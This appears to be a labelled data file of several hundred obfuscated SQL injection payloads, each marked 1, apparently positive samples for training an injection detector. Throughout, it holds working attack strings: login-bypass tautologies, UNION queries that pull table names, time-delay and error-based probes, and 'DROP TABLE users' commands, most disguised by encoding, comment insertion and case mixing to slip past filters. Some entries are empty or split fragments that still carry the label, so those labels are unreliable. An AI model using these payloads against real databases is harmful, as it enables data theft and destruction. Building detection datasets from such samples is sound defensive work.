"' UNION SELECT null, null, null -- #t1skhpo", 1
"tEst' Or '1'='1' /*", 1
"test'OR'1'='1'%0a/*", 1
"%27%2509%2509%2509%2509UNION%2509%2509%2509%2509SELECT%2509%2509%2509%25091%2C2%2C3%2509%2509%2509%2509%2F%2A%21%2A%2FAND%2509%2509%2509%25091%2520%3D%091--", 1
"admin'/**//**//**//**/||/**//**//**//**/'1'%09=/**/'1#n3mmmhphop", 1
"1'				||				(1%20=	1)IF(substring(database(),				1,				1)%20=	'a',				SLEEP(5),				0)								#				more_noise--", 1
"WAITFORDELAY", 1
"'0:0:5'/*!*/# more_noise--/*%0d%0a*/", 1
"'/**/OR/**/1=1/**/--/**/--efg2l0fbpqmqof", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20----68j3oqen0pkrys", 1
"%3B%20dROP%20tABl%45%20userS%3B%20--", 1
"1%2527%20UNION%20SELEC%2554%20table_name%2C%20null%2C%20nu%256cl%2520FROM%20infor%256dati%256fn_schema.tab%256ces%2520--", 1
"'/*!*/UNION SELECT 1,2,3----4a3a1qxr0", 1
"'AND%0%64%0a1=con%76ert(i%6et,@@version) A%4eD%20'a'='a'--%0a", 1
"'%20%20%20OR%20%20%20EXISTS(SELECT%20%20%201%20%20%20FROM%20%20%20users)--", 1
"'			OR			'1' = '1", 1
"1'/*!*/AND su%62string(%64ataba%73e(), 1, 1) %3d 's'%20 %23 more_nois%65--", 1
"%27%20UNION%20SELECT%201,2,3--#dn4ev9l5sz", 1
"1)/*!12345*/UN%49ON SELECT%201,dat%61b%61se(),3--", 1
"%27%20UNION%20SELECT%201%2C2%2C3--#tj74zzlqzn", 1
";/**/Drop/**/%54abLE/*%2a/Us%65%72S;/**/--", 1
"%74Est' Or %271'='1' %2D-", 1
"1)/**/UNION/**/selEcT/**/1,dAtabASE(),3--", 1
"' && 1=1%20-%2d", 1
"'/*!12345*/UNION%20%20%20SELECT%20%20%201,2,3--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 AND 'a'='a'--", 1
"'/*!*/&& extractvalue(1,concat(0x5c,version()))--", 1
"1))UNION%0aSELECT/*%0d%0a*/1,database(),3--", 1
"1) uniON SeLeCT 1,dATabASe(),3--", 1
"1'/**/OR/**/If(S%75B%73tri%6eg(daTaBa%73E(),/**/%31,/**/1)='%61',/**/SlEEP(5),/**/0)/**/ -- RaNDom_noIse--", 1
"1%27%2F%2A%21%2A%2FOR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--%23kp8jf3j84n4gw", 1
";DROPTABLEusers;%0d%0aO/*!12345*/R(1)--", 1
"test'/**/||/**/'1'='1'/**/--/**/--q6o20hgj37b", 1
"1AND%2F%2A%250a%2A%2F1%3D1%0A", 1
"%27UN%2F%2A%21%2A%2F%2549ONSEL%2545CT%2531%2C2%2C3--%0A", 1
"%27%4fR", 1
"EXISTS(S%45LECT/*%0a*/1FR/**/OMu%73ers%29--", 1
"", 1
"1))/*!*/UnIoNSELecT/*%0d%0a*/1,DATaBaSe(),3--%0a", 1
"1'UN/*!12345*/IONSELECTtable_name,null,nullFROMinformation_schema.tables", 1
"--", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3----c4x8egqhv9nlbrf", 1
"%27%20%254fR%201%3D1%20--%2520", 1
"%3B%20dRoP%20tabLE%20UsERS%3B%20--", 1
"1        AND        1	=%091 AND 'a'='a'", 1
"%27AND%250d%250a1%3D1--%250a%23r1isvu6uye", 1
"1))/**/UNION/**/SELECT/**/1,database(),3--#pg5o474i", 1
";DROP%0d%0aTABL%45users;", 1
"%2d-#llwz%6f0%6321c%0a", 1
"1%u0027%u0020unIOn%u0020SeleCt%u0020tabLe_NaME,%u0020null,%u0020NULl%u0020FrOM%u0020INfORMAtiON_ScHema.TABles%u0020--", 1
"'/**/AND", 1
"%0a%0d%0aextractvalue(1,concat(0x5c,version()))--", 1
"adm%69n%27%20%20%20%20OR%20%%320%%320%20%2%371%27%20%3D%09%271", 1
"'/**/AND e%78tr%61c%74value(1,conc%61%74(0x5c,version())) /*!*/AND 1=1----x98dh7", 1
"'OR%0d%0a1=1 /*!*/AND 1=1--", 1
"'AND1LIKEconvert(int,@@version)--%0d%0a", 1
"test'/*!*/OR%09%09%09%09'1'%20=	'1'%09%09%09%09--%09%09%09%09", 1
"1%u0020AND%u00201<=1", 1
"%27%20%55NION%%320S%45%4cECT%20null%2c%20null,%20null%20--%20", 1
"1'/**/Or ascii(subStrIng(datAbASE(), 1, 1)) > 100 --", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----e9mmzg", 1
"1%u0%3027%u0%3020OR%u0020asc%69i(substring(databa%73e(),%u%30020%31,%u0020%31))%u0020%3E%u00201%30%30%u0020--", 1
"'/**/A%4eD/%2a*/1=convert(int,@@version)--#ktsyt%387c%36o%39%75iio", 1
"1%27/**/OR/**%2f%49f(sUbsTrinG(%44atA%62aSE(),/**/1,/**/1)%3d%%327A%%327,%2f**/%53lEep(%35),/**/0)/**/--", 1
"'/**/OR/**/'1'='1#ieulb315qfzi", 1
"; drOP TABle USERs; ----wcr8o64", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027%3D%u00271%u0027%u0020%u0020#%u0020more_noise--%u0020", 1
"1/**/AND/**/1 = 1", 1
"1/*!*/AND 1=1#e073bfy", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise----psorv2lwmz3b0", 1
"%u0027%U0020or%u0020EXiSts(SELEcT%U00201%U0020fROM%U0020UsErs)--", 1
"%27%20UNION%20SELECT%201%2%432%%32C3%2d-", 1
"WAITFORDELAY%0d%0a'0:0:5'--%0a", 1
"1' OR ascii(%73%75bstri%6eg(database(), 1, %31%29) > 100 --#40o4dcc85p54", 1
"1' OR IF(substring(datab%61%73e(), 1, %31)='a',%20SLEEP%285), 0) --#gj%39lkp1qv%31z", 1
"WA%69TfOr dE%4caY '0:0:%35'----yv37ix4ov", 1
"test' XO%52 '1'='1%27 /*%2d-2ghvqs", 1
"%2527%2520UnioN%2520SelecT%25201%2C2%2C3%2520%2F%2A%21%2A%2FAND%25201%253d1--", 1
"; seLeCt %50g_SlEeP(5);  O%52 'b'%3d'%62'--", 1
"%u0027/*!*/aNd%u00201=1%u0020--%u0020", 1
"1%27%20||%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----jn8i9fa08jrcjy", 1
"' AND extr%61ct%76alue(1,concat%280x5%63,version())%29 AND %27a'IN (1)'a'--", 1
"%u0%3027%u0%3020OR%u0%3020%u00%3271%u0027=%u00271", 1
"1%29%2F%2a%2A%2fuNIon%2F%2A%2a%2fsELecT%2f%2a%2a%2F1%2CdaTabaSe%28%29%2c3--", 1
"WAITFO/*!12345*/R/**/DELAY/**/%270:0:5%27--", 1
"%31' OR IF(sub%73tring(databas%65(), 1, 1)='a'%2c %53LEEP(5),%200) --", 1
"' UNION SELECT 1,2,3 # more_noise--", 1
"%27ANdeXtRaCTvaLuE(1,cOnCat(0X5C,vERSiOn()))--", 1
"", 1
"TEST'    oR    '1'	=%20'1'    /*", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020%20= %u0020%u0027s%u0027%u0020--", 1
";/**/DRO%50/**/TABLE/%2a*%2fus%65rs;/**/--", 1
"test%u0027%u0020OR%u0020%u00271%u0027  =%20%u00271%u0027%u0020--%u0020", 1
"1)/**/UNION/**/SELECT/**/1,database(),3 # more_noise--", 1
"1' || (1=1)IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#jczheai", 1
"%27%20%20%20%20or%20%20%20%201	%3D%20%201%20%20%20%20--%20%20%20%20", 1
"1'/*!*/OR ascii(substring(database(), 1, 1)) > 100  # more_noise--", 1
"%27%20%26%26%20%281%3D1%291%3D1%20--%20", 1
"%27 UNION SEL%45%43T null, null,%20null --", 1
"WAITFO/*!12345*/R%20DELAY%20%270%3A0%3A5%27 AND 'a'='a'--#tl7gtfpo", 1
"' UNION SELECT 1,2,3----00yo5", 1
"' UNION SELEC%54%201,2%2c3--", 1
"1'/%2a*//**/AND/*%2a%2f/**/substring(%64%61tabase(),%2f**%2f/**/1,/**//**/1)/**//**%2f%0%39=/**/%2f**//**//**/'s'/*%2a//**/--", 1
"1)%20UNI%4fn SElecT 1%2cDatAbasE(),3%2d-", 1
"%61dmin'|%7c/*%0%64%0a*/'1'=	'1", 1
"1'%20UNION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20 -- random_noise--", 1
"admin%2527%09%09OR%09%09%25271%2527%2509%253D%2520%25271", 1
"WAITFOR DELAY '0:0:5'--#1d3ulb0uz73", 1
";			S%45LECT%09		%70%67_sleep(5);			--", 1
"1' OR IF(subst%72ing(dat%61base(), 1,%201)='a',%20%53LEEP%285), 0) --", 1
"%27%2f%2A%21%2a%2FOR%20%271%27%3d%271", 1
"' Xor 1In (1)1 --", 1
"1%u0027%u0020unioN%u0020sELeCt%u0020tAble_naME,%u0020null,%u0020nUll%u0020FrOm%u0020inFoRmATioN_sChEma.tables%u0020--", 1
"'			OR			EXISTS(SEL/*!12345*/ECT			1			FROM			users)--", 1
"%3BSELECTpg_sleep%285%29%3B--%2F%2A%250d%250a%2A%2F", 1
"' %4fR%201=%31 -- #eybdgd1k610d", 1
"%74eS%74%27 OR '1'='1'  # mORE_noi%73E--", 1
"1)%29 UNi%4fn SeleCt 1,d%61TAba%53E(),3%20# more_no%69se--#9irt7e", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%u0020/*!*/AND%u00201=1--", 1
"TESt%27%20Or%20%271%27%3d%271%27%20 Or (1)--%20", 1
"WAITFOR%u0020DELAY%u0020%u0027%30%3a0:5%u0027%2d-%u0020/*!*/AND%u00201=1", 1
"1%27/**//**//**//**//**//**/UNION/**//**//**//**//**//**/SELECT/**//**//**//**//**//**/table_name,/**//**//**//**//**//**/null,/**//**//**//**//**//**/null/**//**//**//**//**//**/FROM/**//**//**//**//**//**/information_schema.tables/**//**//**//**//**//**/----7mq10vtjgkamf", 1
"1'/*!*/&& (1=1)substring(database(), 1, 1) = 's'  AND 'a'='a'----6f1cjcrqgcc984", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----bqzazkvcyyyj", 1
"1))    UNION    SELECT    1,database(),3 OR (1)--", 1
"'/*!12345*/UnIoN selEct 1,2,3--", 1
"1) UNio%4e seLEc%54 1,dAtabaSe%28%29,3--", 1
"1%29%29%20uNiOn%20selEcT%201%2CdAtabasE%28%29%2C3--", 1
";/**/SELECT/**/pg_sleep(5);/**/--#0k8d8kt5lzgy", 1
"%u0027UNION", 1
"SELECT%0d%0anull,null,null----i2h7ikfbz", 1
"%27	UNION	SELECT	1,2,3--", 1
"'/*!*/unIon SeLECT 1,2,3--", 1
"test%27XOR%2F%2A%250a%2A%2F%271%27%3D%271%27%2F%2A--bwrurfxbk6n5l%250a", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----w10tg8", 1
"%27%20UNION%20SELECT%20nul%256c%252c%20n%2575ll%2C%20null%20%20%2541%254eD%20%27a%27%3D%27a%27--%20", 1
"'OR%0d%0aEX%49STS(SELECT%0d%0a1FROM%0aus%65rs)----yzr020l%725%67%6103z%6c", 1
"%27%20%20%20%20%20AND%20%20%20%20%201%3C%20%3D%20%201%20%20%20%20%20--%20%20%20%20%20", 1
"'   OR   EXISTS(SELECT   1   FROM   users)   OR   (1)--", 1
"' OR EXISTS(SELECT 1 FROM users)----pv13iz4p", 1
"WAITFOR%2520%2520%2520%2520%2520DELAY%2520%2520%2520%2520%2520%270%3A0%3A5%27--", 1
";/**/DRO%50/**/TABLE%2f**/users;/**//*%2a/OR/*%2a/'b'=%27b'%2d-", 1
"'%20AN%44 ex%74ractvalue(1,concat(0%785c,v%65rsion()))--", 1
"t%2565st%27%2F%2A%2A%2FOR%2F%2A%2A%2F%27%2531%27%3D%271%27%2F%2A%2A%2F%252d-%2F%2A%2A%2F", 1
"WAiTFOR/*!*/DElAy'0:0:5'--", 1
"#o73d15", 1
"1'/*!1%32%3345*/aND SUBStRinG(DaT%41%42AsE()%2c 1,%201) = 's' --#km1zopy0", 1
"1))/*!1%32%3345*/UNION SELECT 1,d%61tabase()%2c3--%2d-e0wfs%7a", 1
"test'        OR        '1'	=%20'1'        /*", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#fahy9ee8i", 1
"WaitFoRDELAy/*%0A*/%u00270:0:5%u0027--/*%0A*/", 1
"'UNION%0aSELECT1,2,3--#efyldnd37%0d%0a", 1
"; DROP TABLE users; ----e3i1ie", 1
"'AND/*%0d%0a*/1=1--#ulzxd3f2vm95w", 1
"1)UNIONSELECT", 1
"1,database(),3%0d%0aAND'a'='a'--%0a", 1
"1' unIOn Select%20taBLE%5fname, %6eULl, NULl %66RoM iNfo%52mat%69on_SCheMa.%74%61BLes --", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/#/**/more_noise--/**/#un2ajd", 1
"'UNION%53ELECT%2f*%0a*%2fnull,null,null%2d-", 1
"test%27%20O/*!*/R%20%271%27IN%20(1)%271%27%20--%20", 1
"test%27%20OR%20%271%27IN%20%281%29%271%27%20--%20", 1
"%27%20XOR%20EXISTS%28SEL/*!12345*/ECT%201%20FROM%20users%29----ftw93ww6vzmt5", 1
"'/**/aNd/**/eXTRaCTvALue(1,CoNCAT(0x5C,VeRsIOn()))--", 1
"%3B%2509%2509%2509DROP%2509%2509%2509TABLE%2509%2509%2509users%3B%2509%2509%2509--", 1
"1) U%4eION%20seLecT 1,dataB%41sE(),%33--", 1
"WAITFOR%2F%2A%252a%2FDEL%2541Y%2F%2A%2A%2F%270%253a0%3A5%27--", 1
"%27%20%20%20%20%20%20%20%20%20%20oR%20%20%20%20%20%20%20%20%20%20exISts%28selECt%20%20%20%20%20%20%20%20%20%201%20%20%20%20%20%20%20%20%20%20From%20%20%20%20%20%20%20%20%20%20UserS%29%20AND%20%27a%27%3D%27a%27--", 1
"%27%2520AnD%201%253d1%20--%20", 1
"'/*!12345*/OR '1'='1 OR 'b'='b'#1idsr2wovomqik", 1
"%31%%327%20OR%20IF%28s%75%62string%28database%28%29%2C%201%2C%201%%329%%33D%27a%27%2C%20SLE%45P%28%35%29%%32C%200%29%20--", 1
"%27%20AnD%201%3d%2531%20%252D-%20", 1
";dRop/*%0d%0a*/taBLe/*%0D%0a*/USErS;", 1
"--", 1
"%27%20AND%201%3D1%20--%20--am5pmq", 1
"WAITFOR%20%20%20%20DELAY%20%20%20%20%u00270:0:5%u0027%20%20%20%20--%20%20%20%20random_noise--", 1
"1)/**/uNIon/**/SElEcT/**/1,DAtABASe(),3 /*!*/AND 1=1--", 1
"%u0027%09OR%09EXISTS(SELECT%091%09FROM%09users)--", 1
"' ANd 1%20=  cONVERt(iNt,@@VErsIon) or 'b'%20=  'b'--", 1
"test'/**/OR/**/'1'='1'/**/--/**/--0cqhxi0dq", 1
"%27%2520%2520UNION%2520%2520SELECT%2520%2520null%2C%2520%2520null%2C%2520%2520null%2520%2520--%2520%2520", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/ OR (1)--", 1
";        sELeCt        PG_SLEEP(5);        ----9aF4Ari29", 1
"WAITFOR%2520%2520%2520DELAY%2520%2520%2520%25u00270%3A0%3A5%25u0027--", 1
"WAItfoR%20deLAy%20%270:0:5%27--", 1
"'AND%0a1=convert(int,@@version)--/*%0d%0a*/#z6ss6nebl3occ6", 1
"1/*%2A%2FANd/**/1=1", 1
"1'      AND      substring(database(),      1,      1)        =%09      's'      --", 1
"'UNIONSELECTnull,", 1
"null,null--", 1
"1))%u0020UNION%u0020S%45LE%43T%201,databas%65(),3--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%23gobkzy9liojx", 1
"'OR%0d%0a'1'='1%0a", 1
"1))/**/unIOn/**/SeleCt/**/1,DAtAbAsE(),3--", 1
"'%09%09An%44%09%%3091	=%20coNVE%52T(InT,@@vE%72SiOn)--", 1
"ADmIn%2527%2520oR%2520%25271%2527%253D%25271", 1
"1%20AND%201%3E%3D1--0rjqnr34", 1
"%u0027/*!*/UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%u0020--%u0020random_noise--%u0020", 1
"1%u0027%20%20%20AND%20%20%20substr%69ng(d%61tab%61%73e(%29,%20%20%201,%20%20%201)%20%20%20%09=%u0020%20%20%20%u0027s%u0027%20%20%20 /*!*/AND 1=1--", 1
"test' OR '1'<='1' --", 1
"1%u0027%u0020OR%u0020I%46(s%75%62s%74ring(databas%65(),%u00201,%u00201)%4cIKE%u0027a%u0027,%u0020S%4cEEP(5),%u00200)%u0020----68t8k49lvznzt", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--#r3rt0y60f7", 1
"WAITFO/**/R%20DELAY%20%270:0:5%27--", 1
"%u0027%u0020%55NION%u0020%53%45LECT%u00201,2,3--", 1
"1 %41Nd 1=1", 1
"%27%20UNION%20SELECT%201%2C2%2C3--#oq0z0", 1
"1%27/**/UnION/**/SeLEct/**/tABlE_nAmE,/**/Null,/**/NUlL/**/FRom/**/iNFOrmatiOn_Schema.tablEs/**/----rjp9gugys1", 1
"'UNIONSELECTnull,/*%0d%0a*/null,null--", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  /*!*/AND 1=1--", 1
"' UNION SELECT null, null, null  OR 'b'='b'--", 1
"%25u0027%25u0020or%25u0020existS%28SelECt%25u00201%25u0020fROM%25u0020UseRs%29--", 1
"1%29%20UNi%6fN%2%30SeLecT%%3201%2CDAtaba%53e%28%%329%2C3--", 1
";%20%20%20SELECT%20%20%20pg_sleep(5);%20%20%20--", 1
"'O/*!12345*/R", 1
"'1'='1OR/*%0a*/(1)", 1
"", 1
"'AND/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--%0a", 1
"test%u002%37%%750020OR%u0020%u%300271%u002%37=%u00271%%750027%u002%30 /*!*/AND 1=1--%u0020", 1
"1%27/*!*/AND/**/s%75%62string(databas%65()%2c/**/1,/**/1)/**/=/**/'s'/**/--", 1
";/*!*/SElECT%0d%0apG_SLeEP(5);--", 1
"test%u0027%20OR%u0020%u00271%27%3d%u00271%u0027%u0020%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--%u0020", 1
"1'OR/*%0d%0a*/ascii(substring(database(),1,1))>100/*%0a*/OR(1)--#xz7s4nc1p", 1
"' aNd eXTracTVALuE(1,CONcAt(0X5C,vERsIoN()))--", 1
"1/**/       AND        1%20=%091", 1
"1)/**/UNION%20%20SELECT%20%201,database(),3----6e3ea86ml35oit3", 1
"' AND 1  =  convert(int,@@version)--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0020AND%u0020%u0027a%u0027%3D%u0027a%u0027--apyd19x50x6q", 1
"1%27%20oR%20ASCiI(%73ubsTring%28D%61%74AbAse(),%201,%201))%20%3e%20100%20--", 1
"; DROP TABLE users; --#utgc0", 1
"'OR", 1
"'1'='1", 1
"", 1
"1)/*!12345*/UNION SELECT 1,database(),3 /*!*/AND 1=1--", 1
"'%20AND1=1%20--%0d%0a", 1
"1 && (1LIKE1)1=1", 1
"1 A%4e%44 1=1#oifgc6s", 1
"%2527AND%252f%2A%250a%2A%2F1%253D1-%252d", 1
"%27%20OR%201%3D1%20--%20--VCt6ZkD8a2TBG5", 1
"1))  UNION  SELECT  1,database(),3--", 1
"1)%u0020uNioN%U0020SELeCt%u00201,daTAbAsE(),3--", 1
"%31' AND subst%72in%67(databa%73e(), 1, 1) = 's' -%2d", 1
"'          UNION          SELECT          1,2,3----95meu0bq4", 1
"%%327%20AND%201%3Dconv%65rt%28in%74%%32C%40%40version%29-%2d", 1
"1%27/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/ OR 'b'='b'--", 1
"1'	or	if(SuBStRINg(DaTAbASE(),	1,	1) =%09'a',	SLEeP(5),	0)	--", 1
"' UNION SELECT 1,2,3--#55ldx0", 1
"tes%74%u0027%u002%30||%u0%3020%u002%371%%750027=%u%300271%u0027%u0020/*", 1
"'&&%0a1=convert(in%74,@@version)AN%44'a'%3d'a'-%2d", 1
"1%27%20UNION%20sELeCt%20taBLE_name%2C%20NUlL%2c%20Null%20fROm%20infORMAtIOn_SCHEma.tablES%20--", 1
"1'ORascii(subs%74r%69ng(database(),%31,1)%29/*%%30a*/>100/*%0a*/%2d-", 1
"1)/*%2112345*/UNION%20SELECT 1%2c%64at%61base(),3--", 1
"'&&/*%0d%0a*/extractvalue(1,concat(0x5c,version()))--", 1
"teST'/**/Or/**/'1'='1'/**//* OR 'b'='b'", 1
"AdMIn%u0027/**/oR/**/%U00271%u0027=%U00271%u0020AND%U0020%U0027A%u0027=%U0027a%u0027", 1
";/**/sElECt PG_SlEep(5); --", 1
"' || 1=1 -- --t25k3e", 1
"1'/**/aND/**/subSTrInG(DATAbasE(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
"'AND%0a1=convert(int,@@version)--%0d%0a#s6i3bd4wmca4cv", 1
"1))UNION", 1
"SELECT1,database(),3AND'a'='a'--", 1
"1%2527%20A%254eD%20%2573%2575bstr%2569ng%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"1%u0020A/*!*/ND%u00201=1", 1
"WAI%2554%2546OR%20DE%254cAY%20%270%3A0%3A5%27--", 1
"1'    AND    substring(database(),    1,    1)    	=      's'    --", 1
"' && 1>=1  XOR (1)--", 1
"adMiN' oR '1'='1 # more_noise#9m3b2", 1
"%74e%73t'/**/OR/**/'%31'  =%20'1'/**//**/AND/**/'a'  =%20'a'--/**/", 1
"1%27/**/UNION/**/SELECT/**/tab%6ce_%6eame,/**/nu%6cl,/**/n%75ll/**/FR%4fM/**/inf%6frma%74ion_sch%65ma.tables/**//**/AND/**/'a'  = 'a'--", 1
"' AND 1=convert(int,@@version)--#5rhikk5", 1
"'%20%7c| (1=%31)1LIKE1 --", 1
"1%u0027ORIF(substring(database(),1,/*%0a*/1)=%u0027a%u0027,SLEEP(5),0)--", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20%23%20more_noise--", 1
"%25u0027%25u%2530%253020UNION%25u00%25320SELE%2543T%25u00201%2C2%2C3--", 1
"1)				UNION				SELECT				1,database(),3--", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--#zz0752zq39i", 1
"%u0027aNd%0A1=1%0D%0a--%0a", 1
"adm%69n%27%20OR%20%27%31%27%3D%271 OR (1)", 1
"%27%09%09%09UNION%09%09%09SELECT%09%09%091,2,3--", 1
"%27/**/AND/**/1%3D1/**//**/AND/**/%27a%27%3D%27a%27--/**/", 1
"'/**/OR/**/EX%49STS%28SELE%43T/**/1/**/FROM/**/%75sers)--", 1
"'/**/Or/**/'1'%20= '1/**/#/**/MoRE_noISe", 1
"1))UNIO%4eS%45LEC%541,database(),%33--%0a", 1
"%2527OR%0A%25271%2527%253D%25271%0A", 1
"WAIT%46OR%u0020DELAY%u0%3020%u00270:0:5%u00%327-%2d--og8nl%34cp", 1
"1'		AND		substring(database(),		1,		1)		 =%09		's'		--", 1
"; SELECT pg_sleep(5);  -- random_noise----bk8vbywkjtx5r2t", 1
"'&&", 1
"(1=1)1=convert(int,@@version)/**/AND/**/'a'='a'--%0d%0a", 1
"1A%4eD", 1
"1>	=	1", 1
"", 1
"%3B%20drop%20tAbLE%20usErS%3B%20--", 1
"'/**/O/*!12345*/R/**/'1'='1", 1
"admin%u0027%u0020%u0020%u0020%u0020O/*!*/R%u0020%u0020%u0020%u0020%u00271%u0027%20=%09%u00271", 1
"1'/*!*/aNd suBStRInG(DATAbasE(), 1, 1) LIKE 's' ----f4ou865i", 1
";%20SeLecT%20pG_Sleep(5);%20--#qUGu2VsNg", 1
";%20sEl/*!*/eCt%20PG_Sleep(5);%20--", 1
"%25U0027%25U0020AnD%25U0020EXtrAcTvALUe%281%2Cconcat%280x5C%2cvErSION%28%29%29%29--", 1
"admin'OR%0d%0a'1'='1", 1
"", 1
"' UNION SELECT 1,2,3----ma2d4w3", 1
"%3B%2520SelECT%2520PG_sLEEp%285%29%3B%2520--", 1
";%20SE%4cECT%20pg_sleep%285);%20%2d-", 1
"1AND1=1%0a/**/--/**/random_noise", 1
"1%27%20UNiON%20SElECT%20taBlE_NaME,%20NULl,%20NulL%20FRom%20infoRmatioN_SCHemA.TaBlES%20--", 1
"%u0027%u0020XOR%u0020%u00271%u0027=%u00271", 1
"TEST'%09Or%09'1'IN%09(1)'1'%09/*", 1
"'/**/A%4eD/**%2f1%4cI%4bEconvert(int,@@vers%69on)--", 1
"%%327%20OR%201%3C%%33D%31%20--%20", 1
"%27AND%250d%250a1%3Dconvert%28int%2C%40%40version%29--%250a", 1
"'OREXISTS(SELECT1FROMusers)--#qmerz/*%0d%0a*/", 1
"a%64min'%09%%309OR%0%39%09'1'LIKE'1", 1
"%27%2F%2A%21%2A%2FOR%20%271%27%3D%271", 1
"'/*!12345*/AND 1IN (1)convert(int,@@version) OR 'b'='b'--", 1
"test'/*!12345*/OR '1'='1' /* -- random_noise", 1
"1'AND%0d%0asubstring(database(),1,", 1
"1)%0a='s'--", 1
"1AND1	=  1", 1
"", 1
"1'%20OR%20IF(s%75bstring(database()%2c 1, %31)=%27a', SLEEP(5), 0) --", 1
"'/*!12345*/AND1=1/*%0d%0a*/--%0a", 1
"test'OR", 1
"'1'='1'--/*%0d%0a*/", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100  -- random_noise--", 1
"test%27%20OR%%320%%327%31%27%3D%271%27%20/* OR (1)", 1
"; sELecT PG_sLEeP(5); --", 1
"' OR '1'='1 # more_noise--6ti97lfd9xyzny4", 1
"%27%20UN/*!%2a/ION%%320SE%4cECT%201,2,3%2d-", 1
"WAITFOR/*%0a*/DELAY'0:0:5'--", 1
"1'AND%0d%0asubstring(database(),1,1)='s'AND'a'='a'--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20----e00nv", 1
"1%u0020&&%u0020(1=%31)%31=1", 1
"1AND/*%0a*/1=1#8t50dfbx6nl%0d%0a", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/#more_noise--", 1
"", 1
"teST' Or '1'='1' -- --7Hcg5w6", 1
"admin'/*!12345*/OR '1'='1--1g6fpeil7nxh84", 1
"test' OR '1'='1'  OR 'b'='b'--", 1
"' AND%20extractval%75e(1,con%63at(0x5c,ve%72s%69on()))--", 1
"1' ANd SubSTrINg(daTabAsE(), 1, 1) >= 'S' --", 1
"1)%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,database(),3%20%20%20%20%20#%20%20%20%20%20more_noise--", 1
"' UNION SELECT 1,2,3--#sngn1uwypyosx", 1
"'			AND			1	=convert(int,@@version)----c81e0by7app/*%0a*/", 1
"tes%74'%20OR/**/'1'='1' /*", 1
"'AND/*%0a%2a/%31=1--#2ifb%377z%0a", 1
"test%u0027/**/OR/**/%u00271%u0027=%u00271%u0027/**/--/**/", 1
"%u0027%u0020A/**/ND%u00201IN%u0020(1)1%u0020--%u0020", 1
"%27%20UNION%20SELECT%201,2,3%09OR%09'b'%20=  'b'--", 1
"1))UNION/*%0d%0a*/SELECT%0a1,database(),3----mqoe60ismjlnw32", 1
"'/%2a!*/AND/**/1=1/**/-%2d/**/", 1
"%27%20%55%4e%49ON%20SELECT%2%301%2C2%2C3%09%09%09%09--%09%09%09%09%72ando%6d_noise--", 1
"a%64min%27%20O/*!12345*/R%20%271%27%3d%271%20AND%20%27a%27%3D%27a%27", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users)----fiu59gx4", 1
";/**/SELECT/**/pg_sleep(5);/**/--#2z1uw6otxn4", 1
"%27OREXISTS(SE%4cECT1%0d%0aF%52OMu%73ers)--#5z%6d88py1", 1
"; drop taBlE USErs; --", 1
"'UNI%4fN%53ELECTnull%2cnull,%0d%0an%75ll OR (1)--", 1
"t%65st%27%20OR%20%%3271%27%3D%271%27%20--%20%23v2%32%67p", 1
"'/**/A%4eD%20extra%63tv%61lu%65(1,concat(0x5c,version()))--#7u553zfy0eewtq", 1
"test%25u0027OR%2F%2A%250d%250a%2A%2F%25u00271%25u0027%3D%25u00271%25u0027--%0A--womtm2pog", 1
"' UNION SELECT 1,2,3----7hao8zm2q", 1
"a%64min%27%20OR%20%271%%327%%33D%271", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027%u0020--%u0020random_noise--", 1
"'/**/OR1>=1%0d%0a--/*%0a*/--45l6rf9d/*%0d%0a*/", 1
"%27%20And%201%3DConVERt(InT,@@vErSIOn)--", 1
"'%20%20%20or%20%20%20'1'%20=/**//**/'1", 1
"1%27%2F%2A%2112345%2A%2FAND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"%27%20AND%201%3Dconvert(int,@@version) OR 'b'='b'----wdd0msq", 1
"1'/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--#udj52b91hzdf", 1
";%44rOP%20TABLE/*%0D%0A*/UsEr%73;", 1
"--/*%0A*/", 1
"%u0027%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u00201%09%3D%u0020%u00201%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020", 1
